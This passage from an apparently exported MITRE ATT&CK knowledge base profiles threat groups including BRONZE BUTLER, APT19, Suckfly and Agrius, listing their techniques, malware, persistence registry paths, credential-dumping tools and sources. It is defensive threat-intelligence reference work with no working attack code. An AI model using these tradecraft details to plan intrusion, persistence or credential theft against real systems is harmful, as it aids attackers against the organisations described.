Python, Create Account: Domain Account, Create Account: Local Account, Create or Modify System Process: Systemd Service, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: Clear Windows Event Logs, Ingress Tool Transfer, Input Capture: Keylogging, Network Service Discovery, Network Share Discovery, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: LSA Secrets, Process Discovery, Process Injection: Dynamic-link Library Injection, Remote Services: Remote Desktop Protocol, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Unsecured Credentials: Credentials In Files, Use Alternate Authentication Material: Pass the Ticket, Video Capture, Virtualization/Sandbox Evasion: System Checks S0096 Systeminfo [19] System Information Discovery References Mandiant. (2018). Mandiant M-Trends 2018. Retrieved November 17, 2024. ClearSky Research Team. (2020, August 1). The Kittens Are Back in Town 3 - Charming Kitten Campaign Evolved and Deploying Spear-Phishing link by WhatsApp. Retrieved April 21, 2021. Certfa Labs. (2021, January 8). Charming Kitten\u2019s Christmas Gift. Retrieved May 3, 2021. Secureworks. (n.d.). COBALT ILLUSION Threat Profile. Retrieved April 14, 2021. Miller, J. et al. (2021, July 13). Operation SpoofedScholars: A Conversation with TA453. Retrieved August 18, 2021. Miller, J. et al. (2021, March 30). BadBlood: TA453 Targets US and Israeli Medical Research Personnel in Credential Phishing Campaigns. Retrieved May 4, 2021. Check Point. (2022, January 11). APT35 exploits Log4j vulnerability to distribute new modular PowerShell toolkit. Retrieved January 24, 2022. ClearSky Cyber Security. (2017, December). Charming Kitten. Retrieved December 27, 2017. Kerner, S. (2014, May 29). Newscaster Threat Uses Social Media for Intelligence Gathering. Retrieved April 14, 2021. ClearSky Research Team. (2019, October 1). The Kittens Are Back in Town2 - Charming Kitten Campaign KeepsGoing on, Using New Impersonation Methods. Retrieved April 21, 2021. Wikoff, A. Emerson, R. (2020, July 16). New Research Exposes Iranian Threat Group Operations. Retrieved March 8, 2021. Burt, T. (2019, March 27). New steps to protect customers from hacking. Retrieved May 27, 2020. Burt, T. (2020, October 28). Cyberattacks target international conference attendees. Retrieved March 8, 2021. US District Court of DC. (2019, March 14). MICROSOFT CORPORATION v. JOHN DOES 1-2, CONTROLLING A COMPUTER NETWORK AND THEREBY INJURING PLAINTIFF AND ITS CUSTOMERS. Retrieved March 8, 2021. Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. DFIR Report. (2022, March 21). APT35 Automates Initial Access Using ProxyShell. Retrieved May 25, 2022. MSTIC. (2021, November 16). Evolving trends in Iranian threat actor activity \u2013 MSTIC presentation at CyberWarCon 2021. Retrieved January 12, 2023. DFIR Report. (2021, November 15). Exchange Exploit Leads to Domain Wide Ransomware. Retrieved January 5, 2023. Bash, A. (2021, October 14). Countering threats from Iran. Retrieved January 4, 2023. Cybereason Nocturnus. (2022, February 1). PowerLess Trojan: Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage. Retrieved June 1, 2022. Microsoft Threat Intelligence. (2021, December 11). Guidance for preventing, detecting, and hunting for exploitation of the Log4j 2 vulnerability. Retrieved December 7, 2023. Check Point Software Technologies. (2015). ROCKET KITTEN: A CAMPAIGN WITH 9 LIVES. Retrieved March 16, 2018. Counter Threat Unit Research Team. (2017, February 15). Iranian PupyRAT Bites Middle Eastern Organizations. Retrieved December 27, 2017. Counter Threat Unit Research Team. (2017, July 27). The Curious Case of Mia Ash: Fake Persona Lures Middle Eastern Targets. Retrieved February 26, 2018. "
},
{
"id": 181,
"title": "Suckfly, Group G0039",
"path": "/groups/G0039/index.html",
"content": " Suckfly Suckfly is a China-based threat group that has been active since at least 2014. [1] ID: G0039 Version: 1.1 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Several tools used by Suckfly have been command-line driven.[2] Enterprise T1046 Network Service Discovery Suckfly the victim's internal network for hosts with ports 8080, 5900, and 40 open.[2] Enterprise T1003 OS Credential Dumping Suckfly used a signed credential-dumping tool to obtain victim account credentials.[2] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Suckfly has used stolen certificates to sign its malware.[1] Enterprise T1078 Valid Accounts Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.[2] Software ID Name References Techniques S0118 Nidiran [1][2] Create or Modify System Process: Windows Service, Ingress Tool Transfer, Masquerading: Masquerade Task or Service References DiMaggio, J. (2016, March 15). Suckfly: Revealing the secret life of your code signing certificates. Retrieved August 3, 2016. DiMaggio, J. (2016, May 17). Indian organizations targeted in Suckfly attacks. Retrieved August 3, 2016. "
},
{
"id": 182,
"title": "BRONZE BUTLER, REDBALDKNIGHT, Tick, Group G0060",
"path": "/groups/G0060/index.html",
"content": " BRONZE BUTLER BRONZE BUTLER is a cyber espionage group with likely Chinese origins that has been active since at least 2008. The group primarily targets Japanese organizations, particularly those in government, biotechnology, electronics manufacturing, and industrial chemistry.[1][2][3] ID: G0060 \u24d8 Associated Groups: REDBALDKNIGHT, Tick Contributors: Trend Micro Incorporated Version: 1.3 Created: 16 January 2018 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description REDBALDKNIGHT [1][3] Tick [1][4][3] Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control BRONZE BUTLER has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.[2][3] Enterprise T1087 .002 Account Discovery: Domain Account BRONZE BUTLER has used net user /domain to identify account information.[2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols BRONZE BUTLER malware has used HTTP for C2.[2] Enterprise T1560 .001 Archive Collected Data: Archive via Utility BRONZE BUTLER has compressed data into password-protected RAR archives prior to exfiltration.[2][3] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder BRONZE BUTLER has used a batch script that adds a Registry Run key to establish malware persistence.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell BRONZE BUTLER has used PowerShell for execution.[2] .003 Command and Scripting Interpreter: Windows Command Shell BRONZE BUTLER has used batch scripts and the command-line interface for execution.[2] .005 Command and Scripting Interpreter: Visual Basic BRONZE BUTLER has used VBS and VBE scripts for execution.[2][3] .006 Command and Scripting Interpreter: Python BRONZE BUTLER has made use of Python-based remote access tools.[3] Enterprise T1132 .001 Data Encoding: Standard Encoding Several BRONZE BUTLER tools encode data with base64 when posting it to a C2 server.[2] Enterprise T1005 Data from Local System BRONZE BUTLER has exfiltrated files stolen from local systems.[2] Enterprise T1039 Data from Network Shared Drive BRONZE BUTLER has exfiltrated files stolen from file shares.[2] Enterprise T1140 Deobfuscate/Decode Files or Information BRONZE BUTLER downloads encoded payloads and decodes them on the victim.[2] Enterprise T1189 Drive-by Compromise BRONZE BUTLER compromised three Japanese websites using a Flash exploit to perform watering hole attacks.[4] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography BRONZE BUTLER has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic. BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.[2] Enterprise T1203 Exploitation for Client Execution BRONZE BUTLER has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.[4][3] Enterprise T1083 File and Directory Discovery BRONZE BUTLER has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.[2] Enterprise T1574 .001 Hijack Execution Flow: DLL BRONZE BUTLER has used legitimate applications to side-load malicious DLLs.[3] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools BRONZE BUTLER has incorporated code into several tools that attempts to terminate anti-virus processes.[3] Enterprise T1070 .004 Indicator Removal: File Deletion The BRONZE BUTLER uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.[2] Enterprise T1105 Ingress Tool Transfer BRONZE BUTLER has used various tools to download files, including DGet (a similar tool to wget).[2] Enterprise T1036 Masquerading BRONZE BUTLER has masked executables with document file icons including Word and Adobe PDF.[3] .002 Right-to-Left Override BRONZE BUTLER has used Right-to-Left Override to deceive victims into executing several strains of malware.[3] .005 Match Legitimate Resource Name or Location BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.[2] Enterprise T1027 .001 Obfuscated Files or Information: Binary Padding BRONZE BUTLER downloader code has included \"0\" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.[2][3] .003 Obfuscated Files or Information: Steganography BRONZE BUTLER has used steganography in multiple operations to conceal malicious payloads.[3] Enterprise T1588 .002 Obtain Capabilities: Tool BRONZE BUTLER has obtained and used open-source tools such as Mimikatz, gsecdump, and Windows Credential Editor.[4] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory BRONZE BUTLER has used various tools (such as Mimikatz and WCE) to perform credential dumping.[2] Enterprise T1566 .001 Phishing: Spearphishing Attachment BRONZE BUTLER used spearphishing emails with malicious Microsoft Word attachments to infect victims.[4][3] Enterprise T1018 Remote System Discovery BRONZE BUTLER typically use ping and Net to enumerate systems.[2] Enterprise T1053 .002 Scheduled Task/Job: At BRONZE BUTLER has used at to register a scheduled task to execute malware during lateral movement.[2] .005 Scheduled Task/Job: Scheduled Task BRONZE BUTLER has used schtasks to register a scheduled task to execute malware during lateral movement.[2] Enterprise T1113 Screen Capture BRONZE BUTLER has used a tool to capture screenshots.[2][3] Enterprise T1518 Software Discovery BRONZE BUTLER has used tools to enumerate software installed on an infected host.[3] Enterprise T1007 System Service Discovery BRONZE BUTLER has used TROJ_GETVERSION to discover system services.[3] Enterprise T1124 System Time Discovery BRONZE BUTLER has used net time to check the local time on a target system.[2] Enterprise T1080 Taint Shared Content BRONZE BUTLER has placed malware on file shares and given it the same name as legitimate documents on the share.[2] Enterprise T1550 .003 Use Alternate Authentication Material: Pass the Ticket BRONZE BUTLER has created forged Kerberos Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) tickets to maintain administrative access.[2] Enterprise T1204 .002 User Execution: Malicious File BRONZE BUTLER has attempted to get users to launch malicious Microsoft Word attachments delivered via spearphishing emails.[4][3] Enterprise T1102 .001 Web Service: Dead Drop Resolver BRONZE BUTLER's MSGET downloader uses a dead drop resolver to access malicious payloads.[2] Software ID Name References Techniques S0469 ABK [3] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Obfuscated Files or Information: Steganography, Process Injection, Software Discovery: Security Software Discovery S0110 at [2] Scheduled Task/Job: At S0473 Avenger [3] Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, File and Directory Discovery, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Steganography, Process Discovery, Process Injection, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery S0470 BBK [3] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Native API, Obfuscated Files or Information: Steganography, Process Injection S0471 build_downer [3] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Native API, Obfuscated Files or Information: Steganography, Software Discovery: Security Software Discovery, System Information Discovery, System Time Discovery S0106 cmd [2] Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Lateral Tool Transfer, System Information Discovery S0187 Daserf [1][4] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Archive Collected Data, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data Obfuscation: Steganography, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Obfuscated Files or Information: Indicator Removal from Tools, OS Credential Dumping: LSASS Memory, Screen Capture, Subvert Trust Controls: Code Signing S0472 down_new [3] Application Layer Protocol: Web Protocols, Data Encoding: Standard Encoding, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Ingress Tool Transfer, Process Discovery, Software Discovery: Security Software Discovery, Software Discovery, System Information Discovery, System Network Configuration Discovery S0008 gsecdump [2][4] OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets S0002 Mimikatz [2][4][3] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [2] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0111 schtasks [2] Scheduled Task/Job: Scheduled Task S0596 ShadowPad [5] Application Layer Protocol: DNS, Application Layer Protocol: File Transfer Protocols, Application Layer Protocol: Web Protocols, Data Encoding: Non-Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Indicator Removal, Ingress Tool Transfer, Modify Registry, Non-Application Layer Protocol, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Scheduled Transfer, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery S0005 Windows Credential Editor [2][4] OS Credential Dumping: LSASS Memory References Chen, J. and Hsieh, M. (2017, November 7). REDBALDKNIGHT/BRONZE BUTLER\u2019s Daserf Backdoor Now Using Steganography. Retrieved December 27, 2017. Counter Threat Unit Research Team. (2017, October 12). BRONZE BUTLER Targets Japanese Enterprises. Retrieved January 4, 2018. Chen, J. et al. (2019, November). Operation ENDTRADE: TICK\u2019s Multi-Stage Backdoors for Attacking Industries and Stealing Classified Data. Retrieved June 9, 2020. DiMaggio, J. (2016, April 28). Tick cyberespionage group zeros in on Japan. Retrieved July 16, 2018. Insikt Group. (2021, February 28). China-Linked Group RedEcho Targets the Indian Power Sector Amid Heightened Border Tensions. Retrieved March 22, 2021. "
},
{
"id": 183,
"title": "Moafee, Group G0002",
"path": "/groups/G0002/index.html",
"content": " Moafee Moafee is a threat group that appears to operate from the Guandong Province of China. Due to overlapping TTPs, including similar custom tools, Moafee is thought to have a direct or indirect relationship with the threat group DragonOK. [1] ID: G0002 Version: 1.1 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1027 .001 Obfuscated Files or Information: Binary Padding Moafee has been known to employ binary padding.[1] Software ID Name References Techniques S0012 PoisonIvy [1] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit References Haq, T., Moran, N., Scott, M., & Vashisht, S. O. (2014, September 10). The Path to Mass-Producing Cyber Attacks [Blog]. Retrieved November 12, 2014. "
},
{
"id": 184,
"title": "APT19, Codoso, C0d0so0, Codoso Team, Sunshop Group, Group G0073",
"path": "/groups/G0073/index.html",
"content": " APT19 APT19 is a Chinese-based threat group that has targeted a variety of industries, including defense, finance, energy, pharmaceutical, telecommunications, high tech, education, manufacturing, and legal services. In 2017, a phishing campaign was used to target seven law and investment firms. [1] Some analysts track APT19 and Deep Panda as the same group, but it is unclear from open source information if the groups are the same. [2] [3] [4] ID: G0073 \u24d8 Associated Groups: Codoso, C0d0so0, Codoso Team, Sunshop Group Contributors: FS-ISAC; Darren Spruell Version: 1.6 Created: 17 October 2018 Last Modified: 11 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description Codoso [4] C0d0so0 [4] Codoso Team [3] Sunshop Group [5] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols APT19 used HTTP for C2 communications. APT19 also used an HTTP malware variant to communicate over HTTP for C2.[1][4] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder An APT19 HTTP malware variant establishes persistence by setting the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\.[4] Enterprise T1059 Command and Scripting Interpreter APT19 downloaded and launched code within a SCT file.[1] .001 PowerShell APT19 used PowerShell commands to execute payloads.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service An APT19 Port 22 malware variant registers itself as a service.[4] Enterprise T1132 .001 Data Encoding: Standard Encoding An APT19 HTTP malware variant used Base64 to encode communications to the C2 server.[4] Enterprise T1140 Deobfuscate/Decode Files or Information An APT19 HTTP malware variant decrypts strings using single-byte XOR keys.[4] Enterprise T1189 Drive-by Compromise APT19 performed a watering hole attack on forbes.com in 2014 to compromise targets.[4] Enterprise T1564 .003 Hide Artifacts: Hidden Window APT19 used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. [1] Enterprise T1574 .001 Hijack Execution Flow: DLL APT19 launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.[4] Enterprise T1112 Modify Registry APT19 uses a Port 22 malware variant to modify several Registry keys.[4] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation APT19 used Base64 to obfuscate executed commands.[1] .013 Obfuscated Files or Information: Encrypted/Encoded File APT19 used Base64 to obfuscate payloads.[1] Enterprise T1588 .002 Obtain Capabilities: Tool APT19 has obtained and used publicly-available tools like Empire.[6][1] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT19 sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.[1] Enterprise T1218 .010 System Binary Proxy Execution: Regsvr32 APT19 used Regsvr32 to bypass application control techniques.[1] .011 System Binary Proxy Execution: Rundll32 APT19 configured its payload to inject into the rundll32.exe.[1] Enterprise T1082 System Information Discovery APT19 collected system architecture information. APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim\u2019s machine.[1][4] Enterprise T1016 System Network Configuration Discovery APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim\u2019s machine.[4] Enterprise T1033 System Owner/User Discovery APT19 used an HTTP malware variant and a Port 22 malware variant to collect the victim\u2019s username.[4] Enterprise T1204 .002 User Execution: Malicious File APT19 attempted to get users to launch malicious attachments delivered via spearphishing emails.[1] Software ID Name References Techniques S0154 Cobalt Strike [1] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0363 Empire [6] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation References Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018. Scott, J. and Spaniel, D. (2016, July 28). ICIT Brief - China\u2019s Espionage Dynasty: Economic Death by a Thousand Cuts. Retrieved June 7, 2018. FireEye. (n.d.). Advanced Persistent Threat Groups. Retrieved August 3, 2018. Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018. Chickowski, E. (2015, February 10). Chinese Hacking Group Codoso Team Uses Forbes.com As Watering Hole. Retrieved September 13, 2018. The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. "
},
{
"id": 185,
"title": "Bouncing Golf, Group G0097",
"path": "/groups/G0097/index.html",
"content": " Bouncing Golf Bouncing Golf is a cyberespionage campaign targeting Middle Eastern countries.[1] ID: G0097 Version: 1.0 Created: 27 January 2020 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Mobile T1655 .001 Masquerading: Match Legitimate Name or Location Bouncing Golf distributed malware as repackaged legitimate applications, with the malicious code in the com.golf package.[1] Software ID Name References Techniques S0421 GolfSpy [1] Archive Collected Data, Audio Capture, Clipboard Data, Data from Local System, Event Triggered Execution: Broadcast Receivers, Exfiltration Over C2 Channel, Indicator Removal on Host: File Deletion, Location Tracking, Obfuscated Files or Information, Process Discovery, Protected User Data: SMS Messages, Protected User Data: Contact List, Protected User Data: Call Log, Screen Capture, Software Discovery, System Information Discovery, Video Capture References E. Xu, G. Guo. (2019, June 28). Mobile Cyberespionage Campaign \u2018Bouncing Golf\u2019 Affects Middle East. Retrieved January 27, 2020. "
},
{
"id": 186,
"title": "Agrius, Pink Sandstorm, AMERICIUM, Agonizing Serpens, BlackShadow, Group G1030",
"path": "/groups/G1030/index.html",
"content": " Agrius Agrius is an Iranian threat actor active since 2020 notable for a series of ransomware and wiper operations in the Middle East, with an emphasis on Israeli targets.[1][2] Public reporting has linked Agrius to Iran's Ministry of Intelligence and Security (MOIS).[3] ID: G1030 \u24d8 Associated Groups: Pink Sandstorm, AMERICIUM, Agonizing Serpens, BlackShadow Contributors: Asritha Narina Version: 1.0 Created: 21 May 2024 Last Modified: 29 August 2024 Version Permalink Live Version Associated Group Descriptions Name Description Pink Sandstorm [4] AMERICIUM [4] Agonizing Serpens [5] BlackShadow [2] Techniques Used Domain ID Name Use Enterprise T1583 Acquire Infrastructure Agrius typically uses commercial VPN services for anonymizing last-hop traffic to victim networks, such as ProtonVPN.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Agrius used 7zip to archive extracted data in preparation for exfiltration.[5] Enterprise T1119 Automated Collection Agrius used a custom tool, sql.net4.exe, to query SQL databases and then identify and extract personally identifiable information.[5] Enterprise T1110 Brute Force Agrius engaged in various brute forcing activities via SMB in victim environments.[5] .003 Password Spraying Agrius engaged in password spraying via SMB in victim environments.[5] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Agrius uses ASPXSpy web shells to enable follow-on command execution via cmd.exe.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service Agrius has deployed IPsec Helper malware post-exploitation and registered it as a service for persistence.[1] Enterprise T1005 Data from Local System Agrius gathered data from database and other critical servers in victim environments, then used wiping mechanisms as an anti-analysis and anti-forensics mechanism.[5] Enterprise T1074 .001 Data Staged: Local Data Staging Agrius has used the folder, C:\\windows\\temp\\s\\, to stage data for exfiltration.[5] Enterprise T1140 Deobfuscate/Decode Files or Information Agrius has deployed base64-encoded variants of ASPXSpy to evade detection.[1] Enterprise T1041 Exfiltration Over C2 Channel Agrius exfiltrated staged data using tools such as Putty and WinSCP, communicating with command and control servers.[5] Enterprise T1190 Exploit Public-Facing Application Agrius exploits public-facing applications for initial access to victim environments. Examples include widespread attempts to exploit CVE-2018-13379 in FortiOS devices and SQL injection activity.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Agrius used several mechanisms to try to disable security tools. Agrius attempted to modify EDR-related services to disable auto-start on system reboot. Agrius used a publicly available driver, GMER64.sys typically used for anti-rootkit functionality, to selectively stop and remove security software processes.[5] Enterprise T1570 Lateral Tool Transfer Agrius downloaded some payloads for follow-on execution from legitimate filesharing services such as ufile.io and easyupload.io.[2] Enterprise T1036 Masquerading Agrius used the Plink tool for tunneling and connections to remote machines, renaming it systems.exe in some instances.[5] Enterprise T1046 Network Service Discovery Agrius used the open-source port scanner WinEggDrop to perform detailed scans of hosts of interest in victim networks.[5] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Agrius used tools such as Mimikatz to dump LSASS memory to capture credentials in victim environments.[5] .002 OS Credential Dumping: Security Account Manager Agrius dumped the SAM file on victim machines to capture credentials.[5] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Agrius tunnels RDP traffic through deployed web shells to access victim environments via compromised accounts.[1] Agrius used the Plink tool to tunnel RDP connections for remote access and lateral movement in victim environments.[5] Enterprise T1018 Remote System Discovery Agrius used the tool NBTscan to scan for remote, accessible hosts in victim environments.[5] Enterprise T1505 .003 Server Software Component: Web Shell Agrius typically deploys a variant of the ASPXSpy web shell following initial access via exploitation.[1] Enterprise T1078 .002 Valid Accounts: Domain Accounts Agrius attempted to acquire valid credentials for victim environments through various means to enable follow-on lateral movement.[5] Software ID Name References Techniques S1133 Apostle Agrius has used Apostle as both a wiper and ransomware-like effects capability in intrusions.[1] Data Destruction, Data Encrypted for Impact, Deobfuscate/Decode Files or Information, Disk Wipe: Disk Content 